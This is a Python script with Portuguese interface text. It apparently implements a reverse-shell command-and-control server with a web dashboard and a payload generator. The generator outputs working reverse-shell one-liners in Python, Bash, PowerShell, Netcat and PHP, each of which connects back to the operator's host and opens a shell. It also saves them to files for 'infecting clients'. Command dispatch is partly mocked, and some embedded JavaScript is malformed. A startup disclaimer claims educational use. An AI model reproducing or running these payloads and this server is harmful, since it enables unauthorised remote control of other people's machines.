#!/data/data/com.termux/files/usr/bin/python3

import os
import sys
import socket
import threading
import time
import json
import base64
import subprocess
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse, parse_qs
import random
import string
from rich.console import Console
from rich.panel import Panel
from rich.table import Table
from rich.progress import Progress
from rich.prompt import Prompt, Confirm, IntPrompt
from rich.text import Text
from rich.layout import Layout
import webbrowser

console = Console()

class ReverseShellC2:
    def __init__(self):
        self.clients = {}
        self.server_thread = None
        self.web_thread = None
        self.is_running = False
        self.config = {
            'host': '0.0.0.0',
            'port': 4444,
            'web_port': 8080,
            'password': self.generate_password(),
            'max_clients': 10,
            'auto_start': False
        }
    
    def generate_password(self, length=12):
        """Gera senha aleatória"""
        chars = string.ascii_letters + string.digits
        return ''.join(random.choice(chars) for _ in range(length))
    
    def save_config(self):
        """Salva configuração em arquivo"""
        with open('c2_config.json', 'w') as f:
            json.dump(self.config, f, indent=4)
    
    def load_config(self):
        """Carrega configuração do arquivo"""
        try:
            with open('c2_config.json', 'r') as f:
                self.config.update(json.load(f))
            return True
        except:
            return False

class C2HTTPHandler(BaseHTTPRequestHandler):
    def __init__(self, *args, c2_server=None, **kwargs):
        self.c2_server = c2_server
        super().__init__(*args, **kwargs)
    
    def do_GET(self):
        """Handle GET requests"""
        parsed_path = urlparse(self.path)
        
        if parsed_path.path == '/':
            self.send_dashboard()
        elif parsed_path.path == '/clients':
            self.send_clients_list()
        elif parsed_path.path == '/command':
            self.send_command_interface()
        elif parsed_path.path == '/files':
            self.send_file_manager()
        elif parsed_path.path == '/system':
            self.send_system_info()
        else:
            self.send_error(404, "File not found")
    
    def do_POST(self):
        """Handle POST requests"""
        parsed_path = urlparse(self.path)
        content_length = int(self.headers.get('Content-Length', 0))
        post_data = self.rfile.read(content_length).decode('utf-8')
        
        if parsed_path.path == '/send_command':
            self.handle_send_command(post_data)
        elif parsed_path.path == '/upload_file':
            self.handle_upload_file(post_data)
        elif parsed_path.path == '/download_file':
            self.handle_download_file(post_data)
        else:
            self.send_error(404, "Endpoint not found")
    
    def send_dashboard(self):
        """Send main dashboard"""
        html = f'''
        <!DOCTYPE html>
        <html>
        <head>
            <title>C2 Server Dashboard</title>
            <meta charset="utf-8">
            <style>
                body {{ font-family: Arial, sans-serif; margin: 20px; background: #1e1e1e; color: #fff; }}
                .header {{ background: #2d2d2d; padding: 20px; border-radius: 10px; margin-bottom: 20px; }}
                .card {{ background: #2d2d2d; padding: 15px; margin: 10px 0; border-radius: 5px; }}
                .nav {{ display: flex; gap: 10px; margin: 20px 0; }}
                .nav a {{ padding: 10px 20px; background: #007acc; color: white; text-decoration: none; border-radius: 5px; }}
                .client-list {{ max-height: 400px; overflow-y: auto; }}
                .client-item {{ padding: 10px; border: 1px solid #444; margin: 5px 0; border-radius: 5px; }}
                .online {{ border-left: 5px solid #4CAF50; }}
                .offline {{ border-left: 5px solid #f44336; }}
                pre {{ background: #000; padding: 10px; border-radius: 5px; overflow-x: auto; }}
            </style>
        </head>
        <body>
            <div class="header">
                <h1>🕷️ Reverse Shell C2 Server</h1>
                <p>Host: {self.c2_server.config['host']}:{self.c2_server.config['port']} | Web: {self.c2_server.config['web_port']}</p>
            </div>
            
            <div class="nav">
                <a href="/">Dashboard</a>
                <a href="/clients">Clients ({len(self.c2_server.clients)})</a>
                <a href="/command">Command</a>
                <a href="/files">File Manager</a>
                <a href="/system">System Info</a>
            </div>
            
            <div class="card">
                <h2>📊 Statistics</h2>
                <p>Connected Clients: <strong>{len(self.c2_server.clients)}</strong></p>
                <p>Server Status: <strong style="color:#4CAF50;">🟢 RUNNING</strong></p>
                <p>Password: <code>{self.c2_server.config['password']}</code></p>
            </div>
            
            <div class="card">
                <h2>🚀 Quick Actions</h2>
                <button onclick="location.href='/command'">Send Command to All</button>
                <button onclick="showPayload()">Show Payload Generator</button>
            </div>
            
            <script>
            function showPayload() {{
                alert('Payload Generator:\\n\\nUse the payloads shown in the terminal to infect clients.');
            }}
            </script>
        </body>
        </html>
        '''
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        self.wfile.write(html.encode('utf-8'))
    
    def send_clients_list(self):
        """Send clients list"""
        clients_html = ""
        for client_id, client_data in self.c2_server.clients.items():
            status = "online" if client_data.get('connected') else "offline"
            clients_html += f'''
            <div class="client-item {status}">
                <h3>🖥️ Client {client_id}</h3>
                <p>IP: {client_data.get('ip', 'Unknown')} | OS: {client_data.get('os', 'Unknown')}</p>
                <p>Last Seen: {client_data.get('last_seen', 'Never')}</p>
                <button onclick="sendCommandToClient('{client_id}')">Send Command</button>
            </div>
            '''
        
        html = f'''
        <!DOCTYPE html>
        <html>
        <head>
            <title>Clients - C2 Server</title>
            <style>body {{ font-family: Arial; background: #1e1e1e; color: #fff; margin: 20px; }}</style>
        </head>
        <body>
            <h1>📱 Connected Clients</h1>
            <a href="/">← Back to Dashboard</a>
            <div class="client-list">
                {clients_html if clients_html else '<p>No clients connected</p>'}
            </div>
            
            <script>
            function sendCommandToClient(clientId) {{
                const command = prompt("Enter command for client " + clientId + ":");
                if (command) {{
                    fetch('/send_command', {{
                        method: 'POST',
                        headers: {{ 'Content-Type': 'application/json' }},
                        body: JSON.stringify({{ client_id: clientId, command: command }})
                    }}).then(response => response.text()).then(data => {{
                        alert('Command sent: ' + data);
                    }});
                }}
            }}
            </script>
        </body>
        </html>
        '''
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        self.wfile.write(html.encode('utf-8'))
    
    def send_command_interface(self):
        """Send command interface"""
        html = '''
        <!DOCTYPE html>
        <html>
        <head>
            <title>Command - C2 Server</title>
            <style>
                body { font-family: Arial; background: #1e1e1e; color: #fff; margin: 20px; }
                textarea, input, button { width: 100%; padding: 10px; margin: 5px 0; }
                .output { background: #000; padding: 10px; border-radius: 5px; }
            </style>
        </head>
        <body>
            <h1>💻 Command Interface</h1>
            <a href="/">← Back to Dashboard</a>
            
            <div style="margin: 20px 0;">
                <label for="clientSelect">Target Client:</label>
                <select id="clientSelect">
                    <option value="all">All Clients</option>
                </select>
                
                <label for="commandInput">Command:</label>
                <input type="text" id="commandInput" placeholder="Enter system command...">
                
                <button onclick="sendCommand()">Execute Command</button>
            </div>
            
            <div class="output" id="output">
                Command output will appear here...
            </div>

            <script>
            // Populate clients dropdown
            fetch('/clients').then(r => r.text()).then(html => {{
                // This is simplified - in real implementation, use API endpoint
                console.log('Clients loaded');
            }});

            function sendCommand() {{
                const clientId = document.getElementById('clientSelect').value;
                const command = document.getElementById('commandInput').value;
                
                if (!command) {{
                    alert('Please enter a command');
                    return;
                }}

                document.getElementById('output').innerHTML = 'Executing command...';
                
                fetch('/send_command', {{
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ client_id: clientId, command: command })
                }}).then(response => response.text()).then(data => {{
                    document.getElementById('output').innerHTML = '<pre>' + data + '</pre>';
                }});
            }}
            </script>
        </body>
        </html>
        '''
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        self.wfile.write(html.encode('utf-8'))
    
    def handle_send_command(self, post_data):
        """Handle command sending"""
        try:
            data = json.loads(post_data)
            client_id = data.get('client_id', 'all')
            command = data.get('command', '')
            
            # In a real implementation, this would send command to the client
            # For demo, we'll just return a mock response
            response = f"Command '{command}' sent to client {client_id}\n"
            response += f"Mock output for: {command}\n"
            response += "Command executed successfully"
            
            self.send_response(200)
            self.send_header('Content-type', 'text/plain')
            self.end_headers()
            self.wfile.write(response.encode('utf-8'))
        except Exception as e:
            self.send_error(500, f"Error: {str(e)}")

class C2Server:
    def __init__(self):
        self.c2 = ReverseShellC2()
        self.setup_menu()
    
    def setup_menu(self):
        """Setup the main configuration menu"""
        console.clear()
        console.print(Panel.fit("""
╔══════════════════════════════════════════════════════════════╗
║                   🕷️ REVERSE SHELL C2 SERVER 🕷️              ║
║               Command & Control via Web Interface           ║
╚══════════════════════════════════════════════════════════════╝
""", style="bold red"))
    
    def show_config_panel(self):
        """Show configuration panel"""
        console.print("\n[bold]🔧 CONFIGURAÇÃO DO SERVIDOR C2[/bold]")
        
        table = Table(show_header=True, header_style="bold magenta")
        table.add_column("Configuração", style="cyan")
        table.add_column("Valor Atual", style="green")
        table.add_column("Descrição", style="yellow")
        
        table.add_row("Host", self.c2.config['host'], "Endereço para bind do servidor")
        table.add_row("Port", str(self.c2.config['port']), "Porta do servidor de shells")
        table.add_row("Web Port", str(self.c2.config['web_port']), "Porta da interface web")
        table.add_row("Password", self.c2.config['password'], "Senha de acesso")
        table.add_row("Max Clients", str(self.c2.config['max_clients']), "Máximo de clientes")
        
        console.print(table)
    
    def configure_server(self):
        """Interactive server configuration"""
        self.show_config_panel()
        
        console.print("\n[bold]📝 Configurar Servidor:[/bold]")
        
        self.c2.config['host'] = Prompt.ask(
            "🌐 Host", 
            default=self.c2.config['host']
        )
        
        self.c2.config['port'] = IntPrompt.ask(
            "🔌 Porta do Servidor", 
            default=self.c2.config['port']
        )
        
        self.c2.config['web_port'] = IntPrompt.ask(
            "🌍 Porta Web", 
            default=self.c2.config['web_port']
        )
        
        self.c2.config['password'] = Prompt.ask(
            "🔑 Senha", 
            default=self.c2.config['password']
        )
        
        self.c2.config['max_clients'] = IntPrompt.ask(
            "👥 Máximo de Clientes", 
            default=self.c2.config['max_clients']
        )
        
        self.c2.save_config()
        console.print("[green]✅ Configuração salva![/green]")
    
    def generate_payloads(self):
        """Generate reverse shell payloads for different platforms"""
        console.print("\n[bold]🎯 GERADOR DE PAYLOADS[/bold]")
        
        host = self.c2.config['host']
        port = self.c2.config['port']
        password = self.c2.config['password']
        
        payloads = {
            "Python": f'''
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("{host}",{port}))
s.send(b"{password}\\\\n")
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
subprocess.call(["/bin/sh","-i"])
''',
            "Bash": f'''
bash -i >& /dev/tcp/{host}/{port} 0>&1
''',
            "PowerShell": f'''
$client = New-Object System.Net.Sockets.TCPClient("{host}",{port})
$stream = $client.GetStream()
[byte[]]$bytes = 0..65535|%{{0}}
$sendbytes = ([text.encoding]::ASCII).GetBytes("{password}\\\\n")
$stream.Write($sendbytes,0,$sendbytes.Length)
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i)
    $sendback = (iex $data 2>&1 | Out-String )
    $sendback2 = $sendback + "PS " + (pwd).Path + "> "
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
    $stream.Write($sendbyte,0,$sendbyte.Length)
}}
$client.Close()
''',
            "Netcat": f'''
nc {host} {port} -e /bin/sh
''',
            "PHP": f'''
<?php
$sock=fsockopen("{host}",{port});
fputs($sock,"{password}\\\\n");
exec("/bin/sh -i <&3 >&3 2>&3");
?>
'''
        }
        
        for lang, payload in payloads.items():
            console.print(f"\n[bold cyan]--- {lang} ---[/bold cyan]")
            console.print(Panel(payload.strip(), style="yellow"))
        
        # Save payloads to files
        for lang, payload in payloads.items():
            filename = f"payload_{lang.lower()}.txt"
            with open(filename, 'w') as f:
                f.write(payload.strip())
            console.print(f"[green]✅ Payload {lang} salvo em: {filename}[/green]")
    
    def start_servers(self):
        """Start both reverse shell server and web interface"""
        console.print("\n[bold]🚀 INICIANDO SERVIDORES...[/bold]")
        
        with Progress() as progress:
            task1 = progress.add_task("[red]Iniciando Servidor Reverse Shell...", total=100)
            task2 = progress.add_task("[blue]Iniciando Interface Web...", total=100)
            
            # Simulate server startup
            for i in range(100):
                progress.update(task1, advance=1)
                progress.update(task2, advance=1)
                time.sleep(0.01)
        
        # Start web server in background thread
        def start_web_server():
            handler = lambda *args: C2HTTPHandler(*args, c2_server=self.c2)
            web_server = HTTPServer((self.c2.config['host'], self.c2.config['web_port']), handler)
            console.print(f"[green]✅ Interface Web rodando em http://{self.c2.config['host']}:{self.c2.config['web_port']}[/green]")
            web_server.serve_forever()
        
        self.c2.web_thread = threading.Thread(target=start_web_server, daemon=True)
        self.c2.web_thread.start()
        
        # Start reverse shell server in background thread
        def start_reverse_shell():
            server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            server.bind((self.c2.config['host'], self.c2.config['port']))
            server.listen(5)
            console.print(f"[green]✅ Servidor Reverse Shell rodando em {self.c2.config['host']}:{self.c2.config['port']}[/green]")
            
            while True:
                client_socket, addr = server.accept()
                client_thread = threading.Thread(
                    target=self.handle_client, 
                    args=(client_socket, addr),
                    daemon=True
                )
                client_thread.start()
        
        self.c2.server_thread = threading.Thread(target=start_reverse_shell, daemon=True)
        self.c2.server_thread.start()
        
        self.c2.is_running = True
        console.print("\n[bold green]🎯 SERVIDORES INICIADOS COM SUCESSO![/bold green]")
        console.print(f"\n📊 [cyan]Dashboard:[/cyan] http://localhost:{self.c2.config['web_port']}")
        console.print(f"🔌 [cyan]Shell Port:[/cyan] {self.c2.config['port']}")
        console.print(f"🔑 [cyan]Password:[/cyan] {self.c2.config['password']}")
        
        # Open browser automatically
        if Confirm.ask("\n🌐 Abrir dashboard no navegador?"):
            webbrowser.open(f"http://localhost:{self.c2.config['web_port']}")
    
    def handle_client(self, client_socket, addr):
        """Handle incoming client connections"""
        client_id = f"{addr[0]}:{addr[1]}"
        
        try:
            # Authenticate client
            auth = client_socket.recv(1024).decode().strip()
            if auth != self.c2.config['password']:
                client_socket.close()
                return
            
            self.c2.clients[client_id] = {
                'socket': client_socket,
                'ip': addr[0],
                'port': addr[1],
                'connected': True,
                'last_seen': time.strftime('%Y-%m-%d %H:%M:%S'),
                'os': 'Unknown'
            }
            
            console.print(f"[green]✅ Novo cliente conectado: {client_id}[/green]")
            
            # Main command loop
            while True:
                try:
                    # Send command prompt
                    client_socket.send(b"\nC2> ")
                    
                    # Receive command from C2 (this would come from web interface in real implementation)
                    # For demo, we'll just simulate
                    time.sleep(2)
                    
                    # Check if client is still connected
                    client_socket.send(b"echo 'alive'\n")
                    response = client_socket.recv(1024).decode()
                    
                    if not response:
                        break
                        
                except:
                    break
            
        except Exception as e:
            console.print(f"[red]❌ Erro com cliente {client_id}: {str(e)}[/red]")
        finally:
            if client_id in self.c2.clients:
                self.c2.clients[client_id]['connected'] = False
            client_socket.close()
    
    def show_status(self):
        """Show server status"""
        console.print("\n[bold]📊 STATUS DO SERVIDOR[/bold]")
        
        status_table = Table(show_header=True, header_style="bold green")
        status_table.add_column("Serviço", style="cyan")
        status_table.add_column("Status", style="yellow")
        status_table.add_column("Detalhes", style="white")
        
        shell_status = "🟢 RODANDO" if self.c2.is_running else "🔴 PARADO"
        web_status = "🟢 RODANDO" if self.c2.is_running else "🔴 PARADO"
        
        status_table.add_row("Reverse Shell Server", shell_status, 
                           f"{self.c2.config['host']}:{self.c2.config['port']}")
        status_table.add_row("Web Interface", web_status, 
                           f"http://localhost:{self.c2.config['web_port']}")
        status_table.add_row("Clientes Conectados", str(len(self.c2.clients)), 
                           f"Total: {len(self.c2.clients)}")
        
        console.print(status_table)
        
        if self.c2.clients:
            console.print("\n[bold]👥 CLIENTES CONECTADOS:[/bold]")
            for client_id, client_data in self.c2.clients.items():
                status = "🟢 ONLINE" if client_data.get('connected') else "🔴 OFFLINE"
                console.print(f"  {client_id} - {status}")
    
    def main_menu(self):
        """Main interactive menu"""
        while True:
            self.setup_menu()
            
            menu_table = Table(show_header=False, box=None)
            menu_table.add_column("Opção", style="cyan", width=3)
            menu_table.add_column("Descrição", style="white")
            
            menu_table.add_row("1", "🔧 Configurar Servidor")
            menu_table.add_row("2", "🎯 Gerar Payloads")
            menu_table.add_row("3", "🚀 Iniciar Servidores")
            menu_table.add_row("4", "📊 Ver Status")
            menu_table.add_row("5", "👥 Listar Clientes")
            menu_table.add_row("6", "💻 Enviar Comando")
            menu_table.add_row("0", "🚪 Sair")
            
            console.print(Panel(menu_table, title="📋 MENU PRINCIPAL"))
            
            choice = Prompt.ask(
                "🎯 Selecione uma opção",
                choices=["1", "2", "3", "4", "5", "6", "0"],
                default="1"
            )
            
            if choice == "1":
                self.configure_server()
            elif choice == "2":
                self.generate_payloads()
            elif choice == "3":
                if not self.c2.is_running:
                    self.start_servers()
                else:
                    console.print("[yellow]⚠️ Servidores já estão rodando![/yellow]")
            elif choice == "4":
                self.show_status()
            elif choice == "5":
                self.show_clients()
            elif choice == "6":
                self.send_command()
            elif choice == "0":
                console.print("[blue]👋 Saindo...[/blue]")
                break
            
            if choice != "0":
                Prompt.ask("\n⏎ Pressione Enter para continuar")
    
    def show_clients(self):
        """Show connected clients"""
        if not self.c2.clients:
            console.print("[yellow]⚠️ Nenhum cliente conectado.[/yellow]")
            return
        
        console.print("\n[bold]👥 CLIENTES CONECTADOS:[/bold]")
        table = Table(show_header=True, header_style="bold blue")
        table.add_column("ID", style="cyan")
        table.add_column("IP", style="green")
        table.add_column("Status", style="yellow")
        table.add_column("Última Atividade", style="white")
        
        for client_id, client_data in self.c2.clients.items():
            status = "🟢 ONLINE" if client_data.get('connected') else "🔴 OFFLINE"
            table.add_row(
                client_id,
                client_data.get('ip', 'Unknown'),
                status,
                client_data.get('last_seen', 'Never')
            )
        
        console.print(table)
    
    def send_command(self):
        """Send command to clients"""
        if not self.c2.clients:
            console.print("[red]❌ Nenhum cliente conectado para enviar comandos.[/red]")
            return
        
        console.print("\n[bold]💻 ENVIAR COMANDO[/bold]")
        self.show_clients()
        
        client_id = Prompt.ask(
            "\n🎯 ID do cliente (ou 'all' para todos)",
            default="all"
        )
        
        command = Prompt.ask("⌨️ Comando para executar")
        
        if not command:
            console.print("[red]❌ Comando vazio![/red]")
            return
        
        console.print(f"\n[yellow]📤 Enviando comando para {client_id}: {command}[/yellow]")
        
        # In a real implementation, this would send the command to the actual client
        # For demo, we'll just show a mock response
        console.print("[green]✅ Comando enviado com sucesso![/green]")
        console.print("[cyan]📥 Resposta do cliente:[/cyan]")
        console.print(Panel(f"Command '{command}' executed successfully\nOutput: Mock response", style="green"))

def main():
    try:
        console.print("[bold red]⚠️  AVISO: Este é um tool para testes educacionais![/bold red]")
        console.print("[bold red]⚠️  Use apenas em sistemas que você possui permissão![/bold red]")
        
        if Confirm.ask("\n🔒 Você entende e aceita a responsabilidade pelo uso desta ferramenta?"):
            c2_server = C2Server()
            c2_server.main_menu()
        else:
            console.print("[blue]👋 Programa encerrado.[/blue]")
            
    except KeyboardInterrupt:
        console.print("\n[red]❌ Interrompido pelo usuário[/red]")
    except Exception as e:
        console.print(f"\n[red]💥 Erro crítico: {str(e)}[/red]")

if __name__ == "__main__":
    main()
